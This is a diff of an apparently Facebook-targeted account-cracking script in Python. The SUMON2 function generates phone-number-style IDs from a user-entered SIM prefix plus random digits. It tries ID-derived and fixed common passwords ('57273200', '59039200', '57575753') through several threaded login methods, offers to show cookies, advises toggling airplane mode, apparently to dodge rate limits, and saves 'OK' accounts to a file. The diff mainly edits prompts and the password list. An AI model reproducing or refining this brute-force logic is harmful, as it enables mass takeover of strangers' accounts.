@@ -651,16 +651,16 @@ def SUMON2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] USE FOUR DIGIT   6377')
+    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (6377)')
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    kode = input('[+] INTER CODE : ')
+    kode = input('[+] INPUT CODE : ')
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    limit = int(input('[+] INTER LIMIT : '))
+    limit = int(input('[+] LIMIT CLONE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
     clear()
-    print("                 METHOD                       ")
+    print("                CHOOSE METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (1) ")
     print(" [2] METHOD (2) ")
@@ -671,7 +671,7 @@ def SUMON2():
     linex()
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
-    print(" [?] Show Cookies (Y/N) ")
+    print(" [?] Show Cookies : (Y/N) ")
     linex()
     c = input(" [?] INPUT : ")
     if c in ["Y", "y"]:
@@ -682,13 +682,13 @@ def SUMON2():
         clear()
         SUMON_time()
         tl = str(len(user))
-        print(f"[+] YOUR LIMIT : "+tl+" ")
-        print(f"[+] YOUR CODE  : "+kode)
-        linex();print(' USE (\033[1;32mAIRPLANE\033[1;32m) ON/OFF ');linex()
+        print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
+        print(f"[+] YOUR CODE CHOOSED : "+kode)
+        linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
-            pwx = [uid[:6], uid,mk,uid[:8], "59039200", "57273200"]
+            pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -698,9 +698,9 @@ def SUMON2():
             else:
                 SUMON_xd.submit(p,uid,pwx,tl)
     linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[-] CRACK PROCESS COMPLETE')
+    print('[-] TOTAL OK ACCOUNTS : '+str(len(oks)))
+    print('[-] ID SAVE SUMON-OK TXT')
     linex()
 
 def SUMON3():
